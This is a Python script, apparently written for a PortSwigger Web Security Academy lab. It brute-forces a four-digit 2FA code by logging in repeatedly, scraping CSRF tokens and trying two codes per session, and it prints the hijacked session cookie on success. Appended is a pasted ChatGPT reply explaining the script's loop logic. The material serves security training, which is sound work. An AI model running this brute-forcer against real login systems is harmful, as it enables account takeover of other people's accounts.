# Some AI ass here because of scrub
# Scriot utilizes the html.parser from Beautiful soup to get the new csrf tokens for each connection, which is then sent with requests
# This bruteforces a 2FA auth that resets after two tries and pushes back to new login, the script handles this and starts a new login session
# No rate limits are applied in this PS lab, and if any, script should be adjusted accordingly

import requests
from bs4 import BeautifulSoup

url_base = "https://0ac60034042aa6578cfb9e79002f006f.web-security-academy.net"
mfa_codes = [f"{i:04d}" for i in range(10000)]

session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded'
})

def login_and_get_2fa_page():
    # Step 1: GET login page
    login_page = session.get(url_base + "/login")
    soup = BeautifulSoup(login_page.text, 'html.parser')
    csrf_login = soup.find("input", {"name": "csrf"})['value']

    # Step 2: POST login credentials
    login_data = {
        "csrf": csrf_login,
        "username": "carlos",
        "password": "montoya"
    }
    resp = session.post(url_base + "/login", data=login_data)

    # Step 3: Return entire HTML for 2FA page
    return resp

attempts = 0
for i in range(0, len(mfa_codes), 2):
    # Restart session and login
    session.cookies.clear()
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    })

    print("[*] New login session started.")

    # Login and get 2FA page
    resp = login_and_get_2fa_page()

    for j in range(2):
        code = mfa_codes[i + j]
        soup = BeautifulSoup(resp.text, 'html.parser')
        csrf_2fa = soup.find("input", {"name": "csrf"})['value']

        mfa_data = {
            "csrf": csrf_2fa,
            "mfa-code": code
        }
        response = session.post(url_base + "/login2", data=mfa_data)

        if "Incorrect security code" not in response.text and "Invalid CSRF token" not in response.text:
            print(f"[+] 2FA code found: {code}")
            print(f"[+] Session Cookie: {session.cookies.get_dict()}")
            print(f"[+] Response URL: {response.url}")
            print(f"[+] Page preview:\n{response.text[:500]}")
            exit(0)
        else:
            print(f"[-] Tried: {code}")

# Followed by the AI ass explanation of loop logic also:

'''
Thanks. It worked super well. Can you explain this syntax further?
for i in range(0, len(mfa_codes), 2):
ChatGPT said:

Absolutely! That line:

for i in range(0, len(mfa_codes), 2):

is a compact and powerful way to loop through a list two items at a time. Let’s break it down:
🧠 range(start, stop, step) explained:

    start=0: Start from index 0.

    stop=len(mfa_codes): Go up to the end of the list.

    step=2: Increase i by 2 on each iteration (instead of the default 1).

So if len(mfa_codes) is 10000, this loop will generate:

i = 0, 2, 4, 6, ..., 9998

✅ Why it's used here:

We're brute-forcing 2FA codes two at a time, because after two failed attempts the server locks the session or invalidates the CSRF token.

for j in range(2):
    code = mfa_codes[i + j]

This lets you:

    Login once,

    Try code[i] and code[i+1],

    Then reset login + session and try the next two.

🔁 Visual example:

mfa_codes = ['0000', '0001', '0002', '0003', '0004']

# i takes 0, 2, 4
for i in range(0, 5, 2):
    print("i =", i)
    print("Trying:", mfa_codes[i], "and", mfa_codes[i+1])

Output:

i = 0
Trying: 0000 and 0001
i = 2
Trying: 0002 and 0003
i = 4
Trying: 0004 and IndexError (Oops, we went past the end!)

To avoid the IndexError at the end, you could add a check or limit range to len(mfa_codes) - 1.
'''
